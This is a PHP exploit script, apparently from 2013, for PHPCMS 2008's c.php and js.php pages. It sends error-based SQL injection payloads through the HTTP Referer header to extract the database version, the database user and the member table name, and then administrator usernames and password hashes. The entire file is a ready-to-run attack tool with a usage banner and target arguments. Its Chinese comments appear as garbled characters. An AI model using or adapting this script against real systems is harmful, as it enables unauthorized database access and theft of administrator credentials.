<?php
/**
 * Created BY ���Եȴ�
 * Date : 13-5-29
 * Time : ����2:40
 * FileName : phpcms2008_c.php
 * ��ӭ���ʶ��Եȴ�����www.waitalone.cn
 */
print_r('
+------------------------------------------------------+
             PHPCMS2008 c.php/js.php ע��EXP
             Site��http://www.waitalone.cn/
                Exploit BY�� ���Եȴ�
                  Time��2013-05-29
+------------------------------------------------------+
');
if ($argc < 4) {
    print_r('
+------------------------------------------------------+
Useage: php ' . $argv[0] . ' host path type
Host: target server (ip/hostname)
Path: path of phpcms
Type: type=1->c.php type=2->js.php
Example: php ' . $argv[0] . ' localhost /phpcms
+------------------------------------------------------+
    ');
    exit;
}
error_reporting(7);
//ͳ��ʱ��
$start_time = func_time();
$host = $argv[1];
$path = $argv[2];
$type = $argv[3];
switch ($type) {
    case 1:
        $url = '/c.php?id=1';
        break;
    case 2:
        $url = '/data/js.php?id=1';
        break;
    default:
        echo '������ע��ҳ��1����2' . "\n";
        exit;
}
//���ݿ�汾
$cmd1 = "' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
$db_ver = get_info($cmd1);
//���ݿ��û�
$cmd2 = "' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
$db_user = get_info($cmd2);
//��ȡ�û���
$cmd3 = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() and table_name like '%_member%' LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
$member = get_info($cmd3);
//��ȡ����Ա����
$cmd4 = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,count(*),0x7e) FROM $member where groupid=1 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
$ad_count = get_info($cmd4);
//��ʾע������
if (preg_match('/MySQL Query/i', send_pack('\''))) {
    echo '���ݿ�汾: ' . $db_ver . "\n";
    echo '���ݿ��û�: ' . $db_user . "\n";
    echo '����Ա����: ' . $ad_count . "\n";
    //��ȡ�������Ա
    foreach (range(0, ($ad_count - 1)) as $i) {
        $cmd5 = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,username,0x3a,password,0x7e) FROM $member where groupid=1 LIMIT $i,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1";
        echo '����Ա' . $i . '-->' . get_info($cmd5) . "\n";
    }
} else {
    exit("������ˣ���վ�����ڴ�©��,�����ע��ҳ������!\n");
}


//�������ݰ�����
function send_pack($cmd)
{
	
    global $host, $path, $url;
    $data = "GET " . $path . "$url HTTP/1.1\r\n";
    $data .= "Host: $host\r\n";
    //$data .= "User-Agent: Baiduspider\r\n";
    $data .= "Referer: " . $cmd . "\r\n";
    $data .= "Connection: Close\r\n\r\n";
    $fp = @fsockopen($host, 80, $errno, $errstr, 10);
    //echo ini_get('default_socket_timeout');//Ĭ�ϳ�ʱʱ��Ϊ60��
    if (!$fp) {
        echo $errno . '-->' . $errstr . "\n";
        exit('Could not connect to: ' . $host);
    } else {
        fwrite($fp, $data);
        $back = '';
        while (!feof($fp)) {
            $back .= fread($fp, 1024);
        }
        fclose($fp);
    }
    return $back;
}

//��ȡ������Ϣ
function get_info($info)
{
    preg_match('/~(.*)~1/i', send_pack($info), $admin_match);
    if (preg_match('/charset=utf-8/i', send_pack($info))) {
        return iconv('utf-8', 'gbk//IGNORE', $admin_match[1]);
    } else {
        return $admin_match[1];
    }
}

//ʱ��ͳ�ƺ���
function func_time()
{
    list($microsec, $sec) = explode(' ', microtime());
    return $microsec + $sec;
}

echo '�ű�ִ��ʱ�䣺' . round((func_time() - $start_time), 4) . '�롣';
?>